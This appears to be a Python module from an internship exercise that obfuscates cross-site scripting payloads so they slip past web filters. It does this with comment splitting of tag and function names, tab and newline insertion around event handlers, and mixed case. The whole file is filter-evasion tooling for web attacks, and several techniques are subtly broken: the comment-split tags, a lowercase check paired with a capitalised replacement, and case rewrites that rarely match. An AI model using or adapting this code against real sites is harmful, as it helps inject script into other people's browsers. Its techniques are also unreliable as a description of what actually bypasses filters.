#!/usr/bin/env python3
"""
XSS Obfuscation - Grammar-specific obfuscation techniques
NOT generic - specific to XSS contexts
ITSOLERA Internship Task - Educational Purpose Only
"""

class XSSObfuscation:
    """Context-specific XSS obfuscation techniques"""
    
    def obfuscate(self, payload: str, technique: str, context: str = "html") -> str:
        """
        Apply context-specific obfuscation
        Different techniques work in different contexts
        """
        
        if technique == "comment":
            return self._comment_obfuscation(payload, context)
        
        elif technique == "whitespace":
            return self._whitespace_obfuscation(payload)
        
        elif technique == "case":
            return self._case_obfuscation(payload)
        
        return payload
    
    def _comment_obfuscation(self, payload: str, context: str) -> str:
        """Insert comments to break patterns"""
        
        if context == "html":
            # HTML comments: <!-- -->
            if "<script" in payload.lower():
                return payload.replace("<script", "<sc<!-->ript")
            elif "<img" in payload.lower():
                return payload.replace("<img", "<i<!-->mg")
            elif "<svg" in payload.lower():
                return payload.replace("<svg", "<s<!-->vg")
            elif "<body" in payload.lower():
                return payload.replace("<body", "<bo<!-->dy")
            elif "<iframe" in payload.lower():
                return payload.replace("<iframe", "<if<!-->rame")
            
        elif context == "attribute":
            # Can't use HTML comments in attributes, use tab/space instead
            if "javascript:" in payload.lower():
                return payload.replace("javascript:", "java\t script:")
            
        elif context == "javascript":
            # JavaScript comments: // or /* */
            if "alert" in payload:
                return payload.replace("alert", "al/*comment*/ert")
            if "eval" in payload:
                return payload.replace("eval", "ev/*comment*/al")
            if "function" in payload.lower():
                return payload.replace("Function", "Func/*comment*/tion")
        
        return payload
    
    def _whitespace_obfuscation(self, payload: str) -> str:
        """Abuse whitespace characters"""
        
        # Replace spaces with tabs or newlines
        obfuscated = payload.replace(" ", "\t")
        obfuscated = obfuscated.replace("alert", "alert\t")
        obfuscated = obfuscated.replace("onerror", "onerror\r")
        obfuscated = obfuscated.replace("onload", "onload\n")
        obfuscated = obfuscated.replace("onmouseover", "onmouseover\t")
        obfuscated = obfuscated.replace("javascript:", "javascript\t:")
        obfuscated = obfuscated.replace("<script", "<script\t")
        
        return obfuscated
    
    def _case_obfuscation(self, payload: str) -> str:
        """Mix case to bypass case-sensitive filters"""
        
        result = ""
        for i, char in enumerate(payload):
            if i % 2 == 0:
                result += char.upper()
            else:
                result += char.lower()
        
        # Common patterns
        result = result.replace("SCRIPT", "ScRiPt")
        result = result.replace("ALERT", "AlErT")
        result = result.replace("ONERROR", "OnErRoR")
        result = result.replace("ONLOAD", "OnLoAd")
        result = result.replace("JAVASCRIPT", "JaVaScRiPt")
        
        return result
